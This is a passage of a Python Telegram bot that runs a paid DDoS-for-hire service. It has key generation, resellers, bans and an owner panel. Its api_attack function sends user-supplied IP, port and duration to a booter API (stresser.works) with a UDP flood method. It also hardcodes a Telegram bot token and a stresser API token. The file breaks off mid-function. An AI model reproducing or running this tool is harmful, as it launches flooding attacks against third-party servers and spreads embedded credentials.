#!/usr/bin/env python3
"""
˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙄𝚇˼ ♪
Owner: 1987818347
"""

import telebot
from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import re
import sys
import json
import random
import string
from datetime import datetime, timedelta
import time
import requests
import traceback

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIG =============
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY")
BOT_OWNER = 1987818347
BOT_NAME = "˹𝚩𝖊𝐒𝖙𝐂𝖍𝐄𝖆𝐓 ✘ 𝙳𝐃𝙾𝚂 𝙾𝙉𝙸𝚇˼ ♪"

DEFAULT_API_URL = "https://stresser.works/api/start"
DEFAULT_API_TOKEN = "a05d4ed492744534ab9307b8d9930c2f6a3a8ffa6eea85d07825ec150215747a"
DEFAULT_API_METHOD = "UDP-BIG"
DEFAULT_API_GEOLOCATION = "ALL"

DATA_FILE = "bot_data.json"

# ============= DEVELOPER CONTACT BUTTON =============
DEV_BUTTON_TEXT = "˹ᴅᴇᴠᴇʟᴏᴩᴇʀ˼ 🪽 ➪ 𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞"
DEVELOPER_USERNAME = "BeStChEaT_OwNeR"

def dev_btn_kb():
    """Return inline keyboard with developer contact button"""
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton(
        DEV_BUTTON_TEXT,
        url=f"https://t.me/{DEVELOPER_USERNAME}"
    ))
    return kb

HEALTH = {
    "total_messages": 0, "total_commands": 0, "total_errors": 0,
    "total_attacks": 0, "api_success": 0, "api_failed": 0,
    "last_api_ping_ms": 0, "api_status": "🟡 ᴜɴᴋɴᴏᴡɴ",
    "start_time": BOT_START_TIME
}

# ============= SAFE HELPERS =============
def safe_parse_dt(val):
    if isinstance(val, datetime): return val
    if isinstance(val, str):
        try: return datetime.fromisoformat(val)
        except: return None
    return None

def safe_int(val, default=0):
    try: return int(val)
    except: return default

def ensure_dict(obj):
    return obj if isinstance(obj, dict) else {}

def ensure_list(obj):
    return obj if isinstance(obj, list) else []

# ============= DATA =============
def load_data():
    default = {
        "users": {}, "keys": {}, "resellers": {},
        "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
        "banned_users": {}, "feedbacks": [],
        "stickers": [], "videos": [], "pyf_videos": [],
        "settings": {
            "max_attack_time": 300, "user_cooldown": 5,
            "maintenance_mode": False,
            "maintenance_msg": "Bot under maintenance.",
            "api_url": DEFAULT_API_URL, "api_token": DEFAULT_API_TOKEN,
            "api_method": DEFAULT_API_METHOD, "api_geolocation": DEFAULT_API_GEOLOCATION,
        }
    }
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
                if isinstance(d, dict):
                    for k, v in default.items():
                        d.setdefault(k, v)
                    if not isinstance(d["users"], dict): d["users"] = {}
                    if not isinstance(d["keys"], dict): d["keys"] = {}
                    if not isinstance(d["attack_logs"], list): d["attack_logs"] = []
                    if not isinstance(d["banned_users"], dict): d["banned_users"] = {}
                    if not isinstance(d["stickers"], list): d["stickers"] = []
                    if not isinstance(d["videos"], list): d["videos"] = []
                    if not isinstance(d["pyf_videos"], list): d["pyf_videos"] = []
                    if not isinstance(d["admins"], dict):
                        d["admins"] = {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}}
                    if not isinstance(d.get("settings"), dict):
                        d["settings"] = default["settings"]
                    for sk, sv in default["settings"].items():
                        d["settings"].setdefault(sk, sv)
                    if d["settings"].get("api_token") in [
                        "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563",
                        "", None
                    ]:
                        d["settings"]["api_token"] = DEFAULT_API_TOKEN
                        d["settings"]["api_url"] = DEFAULT_API_URL
                    return d
        except Exception as e:
            print(f"⚠️ Load data error: {e}")
    return default

def save_data(d):
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(d, f, indent=2, default=str)
    except Exception as e:
        print(f"⚠️ Save data error: {e}")

data = load_data()
save_data(data)
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

# ============= ROTATION =============
_sticker_pool = []; _video_pool = []; _pyf_pool = []

def get_random_sticker():
    global _sticker_pool
    stickers = ensure_list(data.get("stickers", []))
    if not stickers: return None
    if not _sticker_pool:
        _sticker_pool = stickers.copy(); random.shuffle(_sticker_pool)
    try: return _sticker_pool.pop()
    except: return None

def get_random_video():
    global _video_pool
    videos = ensure_list(data.get("videos", []))
    if not videos: return None
    if not _video_pool:
        _video_pool = videos.copy(); random.shuffle(_video_pool)
    try: return _video_pool.pop()
    except: return None

def get_random_pyf():
    global _pyf_pool
    pyfs = ensure_list(data.get("pyf_videos", []))
    if not pyfs: return None
    if not _pyf_pool:
        _pyf_pool = pyfs.copy(); random.shuffle(_pyf_pool)
    try: return _pyf_pool.pop()
    except: return None

# ============= HELPERS =============
def is_owner(uid):
    try: return uid == BOT_OWNER or str(uid) in ensure_dict(data.get("admins", {}))
    except: return uid == BOT_OWNER

def is_reseller(uid):
    try:
        r = ensure_dict(data.get("resellers", {})).get(str(uid))
        return r is not None and not r.get('blocked', False)
    except: return False

def is_banned(uid):
    try: return str(uid) in ensure_dict(data.get("banned_users", {}))
    except: return False

def get_setting(k, d=None):
    try: return ensure_dict(data.get("settings", {})).get(k, d)
    except: return d

def set_setting(k, v):
    try:
        if not isinstance(data.get("settings"), dict): data["settings"] = {}
        data["settings"][k] = v; save_data(data)
    except Exception as e:
        print(f"set_setting error: {e}")

def gen_key(length=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def fmt_key(k):
    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])

def has_valid_key(uid):
    try:
        if is_owner(uid) or is_reseller(uid): return True
        u = ensure_dict(data.get("users", {})).get(str(uid))
        if not u or not u.get('key_expiry'): return False
        exp = safe_parse_dt(u['key_expiry'])
        if not exp: return False
        return datetime.now() <= exp
    except: return False

def ist_time_str(dt=None):
    try:
        if dt is None: dt = datetime.now()
        if isinstance(dt, str):
            dt = safe_parse_dt(dt)
            if not dt: dt = datetime.now()
        ist = dt + timedelta(hours=5, minutes=30)
        return ist.strftime('%I:%M:%S %p')
    except: return "N/A"

def ist_full_str(dt=None):
    try:
        if dt is None: dt = datetime.now()
        if isinstance(dt, str):
            dt = safe_parse_dt(dt)
            if not dt: dt = datetime.now()
        ist = dt + timedelta(hours=5, minutes=30)
        return ist.strftime('%d %b %Y, %I:%M:%S %p')
    except: return "N/A"

def time_remaining(uid):
    if is_owner(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
    if is_reseller(uid): return "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
    try:
        u = ensure_dict(data.get("users", {})).get(str(uid))
        if not u or not u.get('key_expiry'): return "❌ ɴᴏ ᴋᴇʏ"
        exp = safe_parse_dt(u['key_expiry'])
        if not exp: return "❌ ɴᴏ ᴋᴇʏ"
        rem = exp - datetime.now()
        total = int(rem.total_seconds())
        if total <= 0: return "❌ ᴇxᴘɪʀᴇᴅ"
        d = total // 86400; h = (total % 86400) // 3600
        m = (total % 3600) // 60; s = total % 60
        parts = []
        if d > 0: parts.append(f"{d}ᴅ")
        if h > 0: parts.append(f"{h}ʜ")
        if m > 0: parts.append(f"{m}ᴍ")
        parts.append(f"{s}ꜱ")
        return " ".join(parts)
    except: return "❌ ᴇʀʀᴏʀ"

def time_remaining_lines(uid):
    if is_owner(uid): return "  ┗ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ᴏᴡɴᴇʀ)"
    if is_reseller(uid): return "  ┗ ♾️ ᴜɴʟɪᴍɪᴛᴇᴅ (ʀᴇꜱᴇʟʟᴇʀ)"
    try:
        u = ensure_dict(data.get("users", {})).get(str(uid))
        if not u or not u.get('key_expiry'):
            return "  ┗ ❌ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ"
        exp = safe_parse_dt(u['key_expiry'])
        if not exp: return "  ┗ ❌ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ"
        rem = exp - datetime.now()
        total = int(rem.total_seconds())
        if total <= 0: return "  ┗ ❌ ᴇxᴘɪʀᴇᴅ"
        d = total // 86400; h = (total % 86400) // 3600
        m = (total % 3600) // 60; s = total % 60
        lines = []
        if d > 0: lines.append(f"  ┣ 📅 ᴅᴀʏꜱ ➪ <b>{d:02d}</b>")
        if h > 0: lines.append(f"  ┣ 🕐 ʜᴏᴜʀꜱ ➪ <b>{h:02d}</b>")
        if m > 0: lines.append(f"  ┣ ⏱️ ᴍɪɴᴜᴛᴇꜱ ➪ <b>{m:02d}</b>")
        lines.append(f"  ┗ ⚡ ꜱᴇᴄᴏɴᴅꜱ ➪ <b>{s:02d}</b>")
        return "\n".join(lines)
    except: return "  ┗ ❌ ᴇʀʀᴏʀ"

def escape_html(text):
    if text is None: return "N/A"
    try:
        return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    except: return "N/A"

def safe_reply(msg, text, **kwargs):
    try: return bot.reply_to(msg, text, **kwargs)
    except Exception as e:
        print(f"❌ Safe reply error: {e}"); return None

def safe_send(cid, text, **kwargs):
    try: return bot.send_message(cid, text, **kwargs)
    except Exception as e:
        print(f"❌ Safe send error: {e}"); return None

# ============================================================
# ============= BUTTON MATCHING (FULLY FIXED) ================
# ============================================================
def normalize_text(text):
    """Remove invisible unicode chars and normalize for matching"""
    if not text: return ""
    try:
        # Remove all zero-width and invisible characters
        for ch in ['\u200b', '\u200c', '\u200d', '\ufeff', '\u00a0', '\u2028', '\u2029']:
            text = text.replace(ch, '')
        return text.strip().upper()
    except: return ""

def get_button_type(text):
    """
    Robust button type detection using keyword matching.
    Order matters: specific first, generic last.
    """
    if not text: return None
    t = normalize_text(text)

    # Helper: check if all keywords present
    def has(*kws):
        return all(k in t for k in kws)

    # ====== OWNER PANEL (most specific) ======
    if has("OWNER", "PANEL"): return "OWNER_PANEL"
    if has("ᴏᴡɴᴇʀ", "ᴘᴀɴᴇʟ"): return "OWNER_PANEL"

    # ====== GENERATE KEY ======
    if has("GEN", "KEY"): return "GEN_KEY"

    # ====== BROADCAST ======
    if "BROADCAST" in t: return "BROADCAST"

    # ====== SETTINGS ======
    if "SETTINGS" in t: return "SETTINGS"

    # ====== PROFILE ======
    if "PROFILE" in t: return "PROFILE"

    # ====== STATUS ======
    if "STATUS" in t: return "STATUS"

    # ====== STATS ======
    if "STATS" in t: return "STATS"

    # ====== USERS ======
    if "USERS" in t: return "USERS"

    # ====== ATTACK (must NOT contain STATS) ======
    if "ATTACK" in t and "STATS" not in t: return "ATTACK"

    # ====== REDEEM ======
    if "REDEEM" in t: return "REDEEM"

    # ====== CLOSE ======
    if "CLOSE" in t: return "CLOSE"

    return None

# Global set to track recently handled button messages (anti double-fire)
_handled_button_msgs = set()

# ============= HEALTH MONITOR =============
def api_health_check():
    while True:
        try:
            time.sleep(30)
            url = get_setting("api_url", DEFAULT_API_URL)
            token = get_setting("api_token", DEFAULT_API_TOKEN)
            start = time.time()
            try:
                r = requests.get(url, params={"token": token}, timeout=10)
                elapsed_ms = int((time.time() - start) * 1000)
                HEALTH["last_api_ping_ms"] = elapsed_ms
                if r.status_code in [200, 400, 401, 403, 405]:
                    HEALTH["api_status"] = "🟢 ᴏɴʟɪɴᴇ"
                else:
                    HEALTH["api_status"] = f"🟡 HTTP {r.status_code}"
            except requests.exceptions.Timeout:
                HEALTH["last_api_ping_ms"] = int((time.time() - start) * 1000)
                HEALTH["api_status"] = "🟠 ᴛɪᴍᴇᴏᴜᴛ"
            except Exception:
                HEALTH["last_api_ping_ms"] = int((time.time() - start) * 1000)
                HEALTH["api_status"] = "🔴 ᴏꜰꜰʟɪɴᴇ"
        except Exception as e:
            print(f"Health check error: {e}")

threading.Thread(target=api_health_check, daemon=True).start()

# ============= BAN CHECK =============
def check_ban(msg):
    try:
        uid = msg.from_user.id
        if is_banned(uid):
            ban_info = ensure_dict(data.get("banned_users", {})).get(str(uid), {})
            if isinstance(ban_info, dict):
                reason = ban_info.get("reason", "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ")
                banned_at = ban_info.get("banned_at", "N/A")
                dt = safe_parse_dt(banned_at)
                if dt:
                    banned_at = (dt + timedelta(hours=5, minutes=30)).strftime("%d %b %Y %I:%M:%S %p")
                else:
                    banned_at = "N/A"
            else:
                reason = "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ"; banned_at = "N/A"

            ban_msg = (
                "╔══════════════════════════╗\n"
                "║             🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 ⛔              ║\n"
                "╚══════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃           🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗 ⛔\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                "🔒 <b>ᴀᴀᴘᴋᴏ ɪꜱ ʙᴏᴛ ꜱᴇ ʙᴀɴ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ</b>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 <b>ʏᴏᴜʀ ɪᴅ:</b> <code>{uid}</code>\n"
                f"📅 <b>ʙᴀɴɴᴇᴅ ᴀᴛ:</b> <code>{banned_at} IST</code>\n"
                f"📝 <b>ʀᴇᴀꜱᴏɴ:</b> <i>{escape_html(reason)}</i>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "⚠️ <b>ᴀᴀᴘ ʙᴏᴛ ᴋᴀ ᴋᴏɪ ʙʜɪ ꜰᴇᴀᴛᴜʀᴇ ᴜꜱᴇ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                "💬 <b>ᴜɴʙᴀɴ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ</b>\n"
                f"👑 <b>ᴏᴡɴᴇʀ ɪᴅ:</b> <code>{BOT_OWNER}</code>\n\n"
                "╔══════════════════════════╗\n"
                "║             🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 🔒          ║\n"
                "╚══════════════════════════╝"
            )
            bot.reply_to(msg, ban_msg, parse_mode="HTML", reply_markup=dev_btn_kb())
            return True
    except Exception as e:
        print(f"check_ban error: {e}")
    return False

# ============= API =============
def api_attack(ip, port, dur):
    try:
        url = get_setting("api_url", DEFAULT_API_URL)
        token = get_setting("api_token", DEFAULT_API_TOKEN)
        method = get_setting("api_method", DEFAULT_API_METHOD)
        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
        start = time.time()
        resp = requests.get(req, timeout=10)
        elapsed_ms = int((time.time() - start) * 1000)
        HEALTH["last_api_ping_ms"] = elapsed_ms
        if resp.status_code == 200:
            HEALTH["api_success"] += 1
            return True, resp.text
        HEALTH["api_failed"] += 1
        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        HEALTH["api_failed"] += 1
        return False, str(e)

# ============= KEYBOARDS =============
def kb_main(uid):
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    if is_owner(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄", "👑 𝐎𝐖𝐍𝐄𝐑 𝐏𝐀𝐍𝐄𝐋")
    elif is_reseller(uid) or has_valid_key(uid):
        m.row("🔥 𝐀𝐓𝐓𝐀𝐂𝐊", "📊 𝐒𝐓𝐀𝐓𝐔𝐒")
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    else:
        m.row("🔑 𝐑𝐄𝐃𝐄𝐄𝐌", "👤 𝐏𝐑𝐎𝐅𝐈𝐋𝐄")
    return m

def kb_owner():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row("🔑 𝐆𝐄𝐍 𝐊𝐄𝐘", "👥 𝐔𝐒𝐄𝐑𝐒")
    m.row("📊 𝐒𝐓𝐀𝐓𝐒", "📢 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓")
    m.row("⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", "❌ 𝐂𝐋𝐎𝐒𝐄")
    return m

# ============= KEY EXPIRY NOTIFIER =============
_expiry_notified = {}

def check_key_expiry_notifications():
    while True:
        try:
            time.sleep(15)
            now = datetime.now()
            for uid_str, u in list(ensure_dict(data.get("users", {})).items()):
                if not isinstance(u, dict): continue
                if not u.get('key_expiry'): continue
                try:
                    expiry = safe_parse_dt(u['key_expiry'])
                    if not expiry: continue
                    if expiry <= now and (now - expiry).total_seconds() < 30:
                        if uid_str not in _expiry_notified:
                            _expiry_notified[uid_str] = True
                            try:
                                expire_msg = (
                                    "╔══════════════════════════╗\n"
                                    "║       ⏰ 𝗞𝗘𝗬 𝗘𝗫𝗣𝗜𝗥𝗘𝗗 ⏰      ║\n"
                                    "╚══════════════════════════╝\n\n"
                                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                                    "┃   💔 𝗧𝗜𝗠𝗘 𝗨𝗣 💔\n"
                                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                                    "🔒 <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ɢᴀʏɪ ʜᴀɪ</b>\n\n"
                                    f"📅 <b>ᴇxᴘɪʀᴇᴅ ᴀᴛ:</b> <code>{ist_full_str(expiry)} IST</code>\n"
                                    f"🕐 <b>ᴄᴜʀʀᴇɴᴛ:</b> <code>{ist_full_str(now)} IST</code>\n\n"
                                    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                    "⚠️ <b>ᴀᴀᴘ ᴀʙ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪ ᴋᴀʀ ꜱᴀᴋᴛᴇ</b>\n\n"
                                    "📌 <b>ɴᴀʏᴀ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                                    "➤ <code>/redeem YOUR-KEY</code>\n\n"
                                    f"👑 <b>ᴏᴡɴᴇʀ:</b> <code>{BOT_OWNER}</code>\n\n"
                                    "╔══════════════════════════╗\n"
                                    "║      🔥 ɢᴇᴛ ɴᴇᴡ ᴋᴇʏ 🍑        ║\n"
                                    "╚══════════════════════════╝"
                                )
                                bot.send_message(int(uid_str), expire_msg, parse_mode="HTML")
                            except Exception as e:
                                print(f"Expiry notify error {uid_str}: {e}")
                except: pass
        except Exception as e:
            print(f"Expiry check error: {e}")

threading.Thread(target=check_key_expiry_notifications, daemon=True).start()

# ============= ACTIVE ATTACKS & COOLDOWN =============
user_cooldown = {}
attack_lock = threading.Lock()
active_attacks = {}
_stop_flags = {}

def get_cd_remaining(uid):
    if uid in user_cooldown:
        r = user_cooldown[uid] - time.time()
        if r > 0: return int(r)
        del user_cooldown[uid]
    return 0

def set_cd(uid):
    cd = get_setting('user_cooldown', 5)
    if cd > 0: user_cooldown[uid] = time.time() + cd

def is_attack_running(uid=None):
    with attack_lock:
        now = datetime.now()
        for aid, atk in list(active_attacks.items()):
            if atk['end_time'] <= now: del active_attacks[aid]
        if uid is None:
            return len(active_attacks) > 0
        return any(a.get('user_id') == uid for a in active_attacks.values())

# ============= START =============
@bot.message_handler(commands=['start', 'help'])
def cmd_start(msg):
    try:
        HEALTH["total_messages"] += 1
        if check_ban(msg): return
        uid = msg.from_user.id
        name = msg.from_user.first_name or "User"
        username = msg.from_user.username
        cid = msg.chat.id

        check_text = (
            "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
            "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
            "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
            "▱▱▱▱▱▱▱▱▱▱ 0%\n"
            "⏳ 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠..."
        )

        check = None
        chosen_pyf_start = get_random_pyf()
        if chosen_pyf_start:
            try:
                check = bot.send_video(cid, chosen_pyf_start, caption=check_text, parse_mode="HTML")
            except:
                check = bot.send_message(cid, check_text, parse_mode="HTML")
        else:
            check = bot.send_message(cid, check_text, parse_mode="HTML")

        steps = [
            ("▰▱▱▱▱▱▱▱▱▱", "10%", "📡 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗻𝗴 𝘁𝗼 𝘀𝗲𝗿𝘃𝗲𝗿..."),
            ("▰▰▰▱▱▱▱▱▱▱", "30%", "👤 𝐕𝐞𝐫𝐢𝐟𝐲𝐢𝐧𝐠 𝐮𝐬𝐞𝐫..."),
            ("▰▰▰▰▰▱▱▱▱▱", "50%", "⚙️ 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙥𝙧𝙤𝙛𝙞𝙡𝙚..."),
            ("▰▰▰▰▰▰▰▱▱▱", "70%", "🔑 ᴄʜᴇᴄᴋɪɴɢ ᴋᴇʏ ꜱᴛᴀᴛᴜꜱ..."),
            ("▰▰▰▰▰▰▰▰▰▱", "90%", "⏳ 𝘍𝘪𝘯𝘢𝘭𝘪𝘻𝘪𝘯𝘨..."),
            ("▰▰▰▰▰▰▰▰▰▰", "100%", "✅ Ｖｅｒｉｆｉｅｄ!"),
        ]

        for bar, pct, status in steps:
            time.sleep(0.3)
            try:
                bot.edit_message_caption(
                    chat_id=cid, message_id=check.message_id,
                    caption=(
                        "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                        "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                        "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                        f"{bar} {pct}\n{status}"
                    ), parse_mode="HTML"
                )
            except:
                try:
                    bot.edit_message_text(
                        chat_id=cid, message_id=check.message_id,
                        text=(
                            "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                            "▌   ☀ ᴄʜᴇᴄᴋɪɴɢ ▱ ɪᴅᴇɴᴛɪᴛʏ ♡               ▐\n"
                            "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                            f"{bar} {pct}\n{status}"
                        ), parse_mode="HTML"
                    )
                except: pass

        is_new = str(uid) not in ensure_dict(data.get("users", {}))
        if is_new:
            join_time = datetime.now()
            ist_join = join_time + timedelta(hours=5, minutes=30)
            data["users"][str(uid)] = {
                "username": username or name, "first_name": name,
                "joined_at": join_time.isoformat(),
                "joined_ist": ist_join.strftime('%d %b %Y, %I:%M:%S %p'),
                "total_attacks": 0, "key_expiry": None
            }
            save_data(data)

        has_key = has_valid_key(uid)
        time_left = time_remaining(uid)

        try: bot.delete_message(cid, check.message_id)
        except: pass

        chosen_sticker = get_random_sticker()
        sticker_msg = None
        if chosen_sticker:
            try: sticker_msg = bot.send_sticker(cid, chosen_sticker)
            except Exception as e: print(f"Sticker Error: {e}")

        header = (
            "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
            f"┊         {BOT_NAME}              ┊\n"
            "〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰〰\n"
        )

        if is_new and not has_key:
            text = header + (
                f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ, {escape_html(name)}!</b>\n\n"
                "🎉 ᴀᴀᴘᴋᴀ ᴀᴄᴄᴏᴜɴᴛ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴄʀᴇᴀᴛᴇ ʜᴏ ɢᴀʏᴀ!\n\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
                f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
                "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                "📌 <b>ᴋᴀɪꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴇ?</b>\n\n"
                "1️⃣ <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b> ➤ <code>/redeem YOUR-KEY</code>\n"
                "2️⃣ <b>ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ</b> ➤ <code>/attack IP PORT TIME</code>\n"
                "3️⃣ <b>ᴄʜᴇᴄᴋ ᴘʀᴏꜰɪʟᴇ</b> ➤ <code>/profile</code>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ <b>ʙɪɴᴀ ᴋᴇʏ ᴋᴇ ᴀᴛᴛᴀᴄᴋ ɴᴀʜɪ ʟᴀɢᴇɢᴀ!</b>\n"
                "🔑 ᴋᴇʏ ʟᴇɴᴇ ᴋᴇ ʟɪʏᴇ ᴏᴡɴᴇʀ ꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴋᴀʀᴏ.\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                "👇 <b>ɴᴇᴇᴄʜᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴏ</b>"
            )
        elif has_key:
            u = ensure_dict(data.get("users", {})).get(str(uid), {})
            total_attacks = safe_int(u.get("total_attacks", 0))
            role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")
            text = header + (
                f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {escape_html(name)}!</b>\n\n"
                "✅ <b>ᴋᴇʏ ᴠᴇʀɪꜰɪᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</b>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>ʀᴏʟᴇ:</b> {role}\n"
                f"🆔 <b>ɪᴅ:</b> <code>{uid}</code>\n"
                f"⏰ <b>ᴛɪᴍᴇ ʟᴇꜰᴛ:</b> <b>{time_left}</b>\n"
                f"🎯 <b>ᴛᴏᴛᴀʟ ᴀᴛᴛᴀᴄᴋꜱ:</b> {total_attacks}\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔥 <b>ʀᴇᴀᴅʏ ᴛᴏ ʟᴀᴜɴᴄʜ ᴀᴛᴛᴀᴄᴋ?</b>"
            )
        else:
            text = header + (
                f"\n👋 <b>ᴡᴇʟᴄᴏᴍᴇ ʙᴀᴄᴋ, {escape_html(name)}!</b>\n\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                "❌ <b>ꜱᴛᴀᴛᴜꜱ:</b> ɴᴏ ᴀᴄᴛɪᴠᴇ ᴋᴇʏ\n"
                f"🎯 <b>ᴍᴇᴛʜᴏᴅ:</b> <code>{escape_html(get_setting('api_method', 'UDP-BIG'))}</code>\n"
                "⚡ <b>ʙᴏᴛ:</b> 🟢 ᴏɴʟɪɴᴇ\n"
                "━━━━━━━━━━━━━━━━━━━━━\n\n"
                "⚠️ <b>ᴀᴀᴘᴋɪ ᴋᴇʏ ᴇxᴘɪʀᴇ ʜᴏ ɢᴀʏɪ ʜᴀɪ</b>\n\n"
                "📌 <b>ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ:</b>\n"
                "➤ <code>/redeem YOUR-KEY</code>\n\n"
                "👇 <b>ɴᴇᴇᴄʜᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ ꜱᴛᴀʀᴛ ᴋᴀʀᴏ</b>"
            )

        if is_new:
            try:
                join_time_display = data["users"][str(uid)].get("joined_ist", "N/A")
                owner_notif = (
                    "╔══════════════════════╗\n"
                    "║         🆕 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗟𝗘𝗥𝗧 🪩     ║\n"
                    "╚══════════════════════╝\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃                👤 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    f"🆔 <b>ᴜꜱᴇʀ ɪᴅ:</b> <code>{uid}</code>\n"
